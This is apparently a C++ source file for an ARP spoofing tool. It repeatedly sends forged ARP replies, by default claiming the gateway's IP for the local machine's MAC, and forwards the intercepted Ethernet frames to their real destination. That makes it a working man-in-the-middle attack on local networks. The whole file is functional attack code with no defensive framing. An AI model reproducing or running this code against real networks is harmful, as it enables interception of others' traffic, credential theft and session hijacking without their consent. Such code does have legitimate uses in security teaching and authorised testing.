#include "Spoofer.h"
#include <thread>
#include <chrono>
#include <thread>
#include <mutex>
#include <condition_variable>

#include <spdlog/spdlog.h>
#include "core/Logger.h"

Spoofer::Spoofer(const std::string& interface_name, const std::chrono::seconds& interval)
:interface(interface_name),
receiver(Receiver::get_instance()),
sender(Sender::get_instance()),
interval(interval),
is_running(false) {
    this->set_interface(this->interface);
}

Spoofer::Spoofer(const Interface& interface, const std::chrono::seconds& interval)
:interface(interface),
receiver(Receiver::get_instance()),
sender(Sender::get_instance()),
interval(interval),
is_running(false) {
    this->set_interface(this->interface);
}

void Spoofer::set_interface(Interface& interface) {
    this->interface = interface;
    Interface* rec_if = receiver.get_interface();
    if(rec_if == nullptr || rec_if->name != interface.name) {
        receiver.set_interface(interface);
    }
    Interface* send_if = sender.get_interface();
    if(send_if == nullptr || send_if->name != interface.name) {
        sender.set_interface(interface);
    }
    Logger::debug("Forwarder interface set to {}.", interface.name);
}

void Spoofer::set_interface(std::string& interface_name) {
    Interface interface(interface_name);
    this->set_interface(interface);
}

Interface Spoofer::get_interface() const {
    return this->interface;
}

void Spoofer::set_interval(const std::chrono::seconds& interval) {
    this->interval = interval;
}

std::chrono::seconds Spoofer::get_interval() const {
    return this->interval;
}

void Spoofer::spoof(const ArpFrame& arp) {
    // send arp constantly
    while (true) {
        sender.send(arp);
        std::this_thread::sleep_for(interval);
    }
}

void Spoofer::spoof(
    const MacAddr& spoofed_mac, 
    const IpAddr& spoofed_ip, 
    const MacAddr& target_mac,
    const IpAddr& target_ip) {
    Logger::info("starting spoof mode");
    // get corresponding mac of target ip
    ArpFrame arp_request = make_arp_request(
        this->interface.mac_addr,
        this->interface.ip_addr,
        target_ip
    );
    sender.send(arp_request);
    MacAddr target_ip_mac;
    Logger::debug("waiting for arp reply of {}...", target_ip.to_string());
    this->receiver.set_timeout(std::chrono::seconds(10));
    receiver.start([&, this](const ArpFrame& arp) {
        if (arp.oper == htons(ARPOP_REPLY)) {
            if(target_ip == arp.spa) {
                target_ip_mac = arp.sha;
            }
        }
    });
    this->receiver.set_timeout(std::chrono::seconds(0));
    if(target_ip_mac == MacAddr()) {
        throw std::runtime_error("can not find the corresponding mac address");
    }
    Logger::debug("corresponding mac of target ip is: {}.", target_ip_mac.to_string());


    ArpFrame arp = make_arp_reply(
        target_mac,
        target_ip,
        spoofed_mac,
        spoofed_ip
    );
    // condition variable to wait for thread to finish
    std::mutex m;
    std::condition_variable cv;
    bool t1_done = false, t2_done = false;
    Logger::info("tell {}({}) {} is at {}.", 
        spoofed_ip.to_string(), 
        spoofed_mac.to_string(), 
        target_ip.to_string(),
        target_mac.to_string());
    // send arp constantly
    this->is_running = true;
    std::thread t1([&, this]() {
        while (true) {
            sender.send(arp);
            std::this_thread::sleep_for(this->interval);
            if(!this->is_running) {
                break;
            }
        }
        t1_done = true;
        cv.notify_one();
        
    });
    t1.detach();
    Logger::info("forward eth frame from {} to {}.", spoofed_mac.to_string(), target_mac.to_string());
    // forward frames from spoofed mac to origin target mac
    std::thread t2([&, this]() {
        Forwarder forwarder(this->interface);
        forwarder.start(spoofed_mac, target_ip_mac);
        t2_done = true;
        cv.notify_one();
    });
    t2.detach();
    std::unique_lock<std::mutex> lk(m);
    cv.wait(lk, [&]() {
        return t1_done && t2_done;
    });
}

void Spoofer::spoof(
    const IpAddr& spoofed_ip, 
    const MacAddr& target_mac,
    const IpAddr& target_ip) {
    ArpFrame arpd_request = make_arp_request(
        this->interface.mac_addr,
        this->interface.ip_addr,
        spoofed_ip
    );
    sender.send(arpd_request);
    MacAddr spoofed_mac;
    Logger::debug("waiting for arp reply of {}...", spoofed_ip.to_string());
    this->receiver.set_timeout(std::chrono::seconds(10));
    receiver.start([&, this](const ArpFrame& arp) {
        if (arp.oper == htons(ARPOP_REPLY)) {
            if(spoofed_ip == arp.spa) {
                spoofed_mac = arp.sha;
            }
        }
    });
    this->receiver.set_timeout(std::chrono::seconds(0));
    if(spoofed_mac == MacAddr()) {
        throw std::runtime_error("can not find the corresponding mac address");
    }
    Logger::debug("spoof mac is: {}.", spoofed_mac.to_string());
    this->spoof(spoofed_mac, spoofed_ip, target_mac, target_ip);
}

void Spoofer::spoof(
    const IpAddr& spoofed_ip, 
    const IpAddr& target_ip) {
    MacAddr host_mac = this->get_interface().mac_addr;
    Logger::debug("host mac is: {}.", host_mac.to_string());
    this->spoof(spoofed_ip, host_mac, target_ip);
}

void Spoofer::spoof(const IpAddr& spoofed_ip) {
    IpAddr gateway = get_gateway(this->interface);
    Logger::debug("gateway is: {}.", gateway.to_string());
    this->spoof(spoofed_ip, gateway);
}

void Spoofer::stop() {
    this->is_running = false;
}